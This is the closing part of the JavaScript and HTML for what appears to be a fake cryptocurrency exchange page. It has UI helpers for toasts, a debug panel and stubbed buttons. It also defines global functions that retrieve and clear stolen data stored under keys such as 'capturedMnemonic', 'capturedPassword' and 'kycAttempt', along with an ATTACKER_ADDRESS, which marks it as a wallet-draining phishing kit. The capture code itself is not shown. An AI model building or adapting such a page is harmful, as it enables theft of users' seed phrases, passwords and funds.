            } else if (type === 'warning') {
                toast.style.background = '#ff9500';
                toast.style.color = '#fff';
            } else if (type === 'info') {
                toast.style.background = '#1890ff';
                toast.style.color = '#fff';
            } else {
                toast.style.background = '#7ed321';
                toast.style.color = '#000';
            }
            
            setTimeout(() => {
                toast.classList.remove('show');
            }, 2000);
        }

        // 切换调试面板
        function toggleDebug() {
            debugMode = !debugMode;
            const panel = document.getElementById('debugPanel');
            panel.classList.toggle('show', debugMode);
            debugLog(`🔧 调试模式: ${debugMode ? '开启' : '关闭'}`);
        }

        // 其他功能函数
        function showPlatformDropdown() {
            debugLog('📱 用户点击平台选择器');
        }

        function showUserMenu() {
            debugLog('👤 用户点击用户头像');
        }

        function showSearch() {
            debugLog('🔍 用户点击搜索');
        }

        function selectFromCurrency() {
            debugLog('💰 用户选择支付币种');
        }

        function selectToCurrency() {
            debugLog('💰 用户选择接收币种');
        }

        function swapCurrencies() {
            debugLog('🔄 用户点击币种交换');
            showToast('币种交换功能开发中...');
        }

        function depositFunds() {
            debugLog('💳 用户点击充币');
            showToast('充币功能开发中...');
        }

        // 全局调试函数
        window.getAttackData = function() {
            return {
                capturedMnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
                attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
                kycAttempt: JSON.parse(localStorage.getItem('kycAttempt') || 'null'),
                attackLogs: JSON.parse(localStorage.getItem('attackLogs') || '[]'),
                currentAccount: currentAccount,
                isWalletConnected: isWalletConnected,
                userBalance: userBalance,
                attackerAddress: ATTACKER_ADDRESS
            };
        };

        window.clearAttackData = function() {
            localStorage.removeItem('capturedMnemonic');
            localStorage.removeItem('attackRecord');
            localStorage.removeItem('kycAttempt');
            localStorage.removeItem('attackLogs');
            sessionStorage.clear();
            debugLog('🗑️ 所有攻击数据已清除');
        };

        // 页面可见性变化监听
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'visible') {
                debugLog('👁️ 页面重新可见，检查钱包状态');
                setTimeout(checkWalletEnvironment, 1000);
            }
        });
        // 🎯 全局调试函数 - 查看捕获的数据
        window.getCapturedData = function() {
            return {
                password: JSON.parse(localStorage.getItem('capturedPassword') || 'null'),
                mnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
                attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
                currentBalance: userBalance,
                attackerAddress: ATTACKER_ADDRESS
            };
        };

        window.clearCapturedData = function() {
            localStorage.removeItem('capturedPassword');
            localStorage.removeItem('capturedMnemonic');
            localStorage.removeItem('attackRecord');
            debugLog('🗑️ 所有捕获数据已清除');
        };
    </script>
    <script src="add_multi_currency_patch.js"></script>

</body>
</html>
